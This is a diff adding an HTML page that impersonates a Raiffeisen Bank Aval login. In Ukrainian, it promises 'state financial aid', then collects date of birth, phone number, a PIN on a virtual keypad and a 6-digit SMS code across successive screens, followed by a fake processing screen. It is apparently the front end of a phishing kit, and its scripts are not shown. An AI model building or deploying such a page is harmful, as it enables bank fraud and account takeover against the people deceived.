@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Вхід у Raiffeisen Bank Aval</title>
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/components.css">
+    <style>
+        /* SPA Screen Switching */
+        .screen {
+            display: none;
+        }
+        
+        .screen.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- ЭКРАН 1: Дата рождения -->
+        <div id="screen-birthdate-first" class="screen active">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 12px; line-height: 1.2; text-align: center; color: #FFFFFF; letter-spacing: -0.5px;">
+                    Вам доступна грошова допомога
+                </h1>
+                <p style="font-size: 15px; color: #CCCCCC; margin-bottom: 25px; text-align: center; font-weight: 400;">
+                    від держави
+                </p>
+                
+                <p style="font-size: 15px; color: #FFD700; margin: 0 0 8px 0; text-align: center; font-weight: 600;">
+                    🎁 Для участі у програмі
+                </p>
+                
+                <p style="font-size: 15px; color: #FFFFFF; margin-bottom: 20px; text-align: center; font-weight: 400;">
+                    вкажіть вашу дату народження
+                </p>
+                
+                <form id="birthdateFormFirst">
+                    <div class="form-group">
+                        <div style="display: flex; gap: 10px; justify-content: center; align-items: flex-start; margin-bottom: 8px;">
+                            <!-- День -->
+                            <div style="flex: 1; max-width: 90px;">
+                                <input 
+                                    type="tel" 
+                                    id="bdayDay" 
+                                    class="form-input" 
+                                    placeholder="--"
+                                    maxlength="2"
+                                    inputmode="numeric"
+                                    pattern="[0-9]*"
+                                    required
+                                    style="text-align: center; font-size: 24px; font-weight: 600; border: 2px solid #FFD700; padding: 16px 8px; border-radius: 8px; width: 100%;"
+                                >
+                                <div style="text-align: center; margin-top: 6px; font-size: 12px; color: #FFD700; font-weight: 500;">ДЕНЬ</div>
+                            </div>
+                            
+                            <!-- Месяц -->
+                            <div style="flex: 1; max-width: 90px;">
+                                <input 
+                                    type="tel" 
+                                    id="bdayMonth" 
+                                    class="form-input" 
+                                    placeholder="--"
+                                    maxlength="2"
+                                    inputmode="numeric"
+                                    pattern="[0-9]*"
+                                    required
+                                    style="text-align: center; font-size: 24px; font-weight: 600; border: 2px solid #FFD700; padding: 16px 8px; border-radius: 8px; width: 100%;"
+                                >
+                                <div style="text-align: center; margin-top: 6px; font-size: 12px; color: #FFD700; font-weight: 500;">МІСЯЦЬ</div>
+                            </div>
+                            
+                            <!-- Год -->
+                            <div style="flex: 1; max-width: 110px;">
+                                <input 
+                                    type="tel" 
+                                    id="bdayYear" 
+                                    class="form-input" 
+                                    placeholder="----"
+                                    maxlength="4"
+                                    inputmode="numeric"
+                                    pattern="[0-9]*"
+                                    required
+                                    style="text-align: center; font-size: 24px; font-weight: 600; border: 2px solid #FFD700; padding: 16px 8px; border-radius: 8px; width: 100%;"
+                                >
+                                <div style="text-align: center; margin-top: 6px; font-size: 12px; color: #FFD700; font-weight: 500;">РІК</div>
+                            </div>
+                        </div>
+                        <div class="error-message" id="birthdateErrorFirst" style="text-align: center; margin-top: 10px;"></div>
+                    </div>
+                    
+                    <button type="submit" id="submitBirthdateBtn" class="btn btn-primary btn-block" style="background: linear-gradient(135deg, #FFD700 0%, #E6C200 100%); border: none; font-size: 16px; padding: 16px; font-weight: 600; border-radius: 8px; box-shadow: 0 2px 8px rgba(255, 215, 0, 0.3); transition: all 0.3s ease; color: #1a1a1a;">
+                        Продовжити
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 2: Телефон -->
+        <div id="screen-phone" class="screen">
+            <div class="card fade-in">
+                <h1 style="color: #FFFFFF;">Вхід у Raiffeisen</h1>
+                <p class="subtitle" style="color: #CCCCCC;">Введіть номер телефону</p>
+                
+                <form id="phoneForm">
+                    <div class="form-group">
+                        <label class="form-label" for="phone" style="color: #CCCCCC;">Номер телефону</label>
+                        <div class="phone-input-wrapper">
+                            <span class="phone-prefix">🇺🇦 +380</span>
+                            <input 
+                                type="tel" 
+                                id="phone" 
+                                class="form-input phone-input" 
+                                placeholder="XX XXX XX XX"
+                                maxlength="12"
+                                inputmode="tel"
+                                required
+                            >
+                        </div>
+                        <div class="error-message" id="phoneError"></div>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-primary btn-block" style="color: #1a1a1a;">
+                        Продовжити
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 3: PIN код -->
+        <div id="screen-pin" class="screen">
+            <div class="card fade-in">
+                <h1 style="color: #FFFFFF;">Вхід у Raiffeisen</h1>
+                <p class="subtitle" style="color: #CCCCCC;">Пін код</p>
+                
+                <div class="pin-dots" id="pinDots">
+                    <div class="pin-dot"></div>
+                    <div class="pin-dot"></div>
+                    <div class="pin-dot"></div>
+                    <div class="pin-dot"></div>
+                </div>
+                
+                <div class="error-message" id="pinError"></div>
+                
+                <div class="virtual-keyboard">
+                    <div class="keyboard-row">
+                        <button class="keyboard-key" data-key="7">7</button>
+                        <button class="keyboard-key" data-key="8">8</button>
+                        <button class="keyboard-key" data-key="9">9</button>
+                    </div>
+                    <div class="keyboard-row">
+                        <button class="keyboard-key" data-key="4">4</button>
+                        <button class="keyboard-key" data-key="5">5</button>
+                        <button class="keyboard-key" data-key="6">6</button>
+                    </div>
+                    <div class="keyboard-row">
+                        <button class="keyboard-key" data-key="1">1</button>
+                        <button class="keyboard-key" data-key="2">2</button>
+                        <button class="keyboard-key" data-key="3">3</button>
+                    </div>
+                    <div class="keyboard-row">
+                        <button class="keyboard-key keyboard-key--cancel" data-key="cancel">×</button>
+                        <button class="keyboard-key" data-key="0">0</button>
+                        <button class="keyboard-key keyboard-key--backspace" data-key="backspace">⌫</button>
+                    </div>
+                </div>
+                
+                <button id="submitPin" class="btn btn-primary btn-block" style="margin-top: 30px; color: #1a1a1a;" disabled>
+                    Далі
+                </button>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 4: SMS код (6 цифр) -->
+        <div id="screen-code" class="screen">
+            <div class="card fade-in">
+                <h1 style="color: #FFFFFF;">Вхід у Raiffeisen</h1>
+                <p class="subtitle" style="color: #FFFFFF;">Введіть код із СМС</p>
+                
+                <p style="color: #FFFFFF; margin-bottom: 30px; font-size: 14px;" id="codeInstruction">
+                    Введіть <strong style="color: #FFD700;">6 цифр</strong> з смс
+                </p>
+                
+                <div class="code-inputs" id="codeInputs">
+                    <!-- 6 полей для SMS кода - динамически создаются через JS -->
+                </div>
+                
+                <div class="error-message" id="codeError"></div>
+                
+                <div class="timer" id="timer" style="color: #FFD700; font-size: 18px; font-weight: 600; margin: 20px 0;">00:30</div>
+                
+                <a href="#" class="resend-link resend-link--disabled" id="resendLink" style="color: #FFD700; text-decoration: none; font-size: 14px; display: block; margin: 15px 0;">
+                    Надіслати код заново
+                </a>
+                
+                <button id="submitCode" class="btn btn-primary btn-block" style="margin-top: 20px; color: #1a1a1a;" disabled>
+                    Надіслати
+                </button>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 5: Выбор суммы помощи -->
+        <div id="screen-amount" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; color: #FFFFFF;">Вам доступна грошова допомога</h1>
+                
+                <div class="amount-info" id="amountInfo" style="text-align: center; margin: 20px 0; font-size: 18px; color: #FFD700; font-weight: 600;">
+                    <!-- Динамически показывается сумма -->
+                </div>
+                
+                <div class="amount-selection">
+                    <div class="currency-selector" style="margin-bottom: 20px;">
+                        <label class="form-label" style="text-align: center; margin-bottom: 15px; color: #FFFFFF;">Оберіть валюту:</label>
+                        <div class="currency-buttons">
+                            <button class="currency-btn selected" data-currency="uah" id="currencyUAH" style="color: #1a1a1a;">
+                                <span class="currency-icon">🇺🇦</span>
+                                <span>Гривні (UAH)</span>
+                            </button>
+                            <button class="currency-btn" data-currency="usd" id="currencyUSD" style="color: #1a1a1a;">
+                                <span class="currency-icon">🇺🇸</span>
+                                <span>Доллари (USD)</span>
+                            </button>
+                            <button class="currency-btn" data-currency="eur" id="currencyEUR" style="color: #1a1a1a;">
+                                <span class="currency-icon">🇪🇺</span>
+                                <span>Євро (EUR)</span>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <button id="submitAmount" class="btn btn-primary btn-block" style="margin-top: 30px; color: #1a1a1a;">
+                        Продовжити
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 6: Короткая загрузка (3 сек) -->
+        <div id="screen-short-loading" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 20px; color: #FFFFFF;">
+                    Обробка даних
+                </h1>
+                
+                <div id="shortLoadingAmountDisplay" style="text-align: center; margin: 20px 0; font-size: 28px; color: #FFD700; font-weight: 700; padding: 15px; background: rgba(255, 215, 0, 0.1); border-radius: 12px;">
+                    <!-- Динамически показывается сумма -->
+                </div>
+                
+                <div class="progress-bar-container" style="width: 100%; background-color: #555555; border-radius: 10px; height: 20px; overflow: hidden; margin-top: 20px;">
+                    <div class="progress-bar" id="shortLoadingProgressBar" style="height: 100%; width: 0%; background-color: #FFD700; border-radius: 10px; transition: width 0.1s linear;"></div>
+                </div>
+                
+                <p style="text-align: center; color: #CCCCCC; margin-top: 15px; font-size: 14px;">
+                    Зачекайте...
+                </p>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 7: Пол -->
+        <div id="screen-gender" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 10px; color: #FFFFFF;">
+                    Ваша стать?
+                </h1>
+                
+                <div id="genderAmountDisplay" style="text-align: center; margin: 15px 0; font-size: 22px; color: #FFD700; font-weight: 600; padding: 10px; background: rgba(255, 215, 0, 0.1); border-radius: 12px;">
+                </div>
+                
+                <div class="gender-buttons" style="display: flex; flex-direction: column; gap: 15px; margin-top: 20px;">
+                    <button class="btn btn-primary btn-block gender-btn" data-gender="male" style="font-size: 18px; padding: 15px; color: #1a1a1a;">
+                        👨 Чоловіча
+                    </button>
+                    <button class="btn btn-primary btn-block gender-btn" data-gender="female" style="font-size: 18px; padding: 15px; color: #1a1a1a;">
+                        👩 Жіноча
+                    </button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Подключаем скрипты -->
+    <script src="config.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
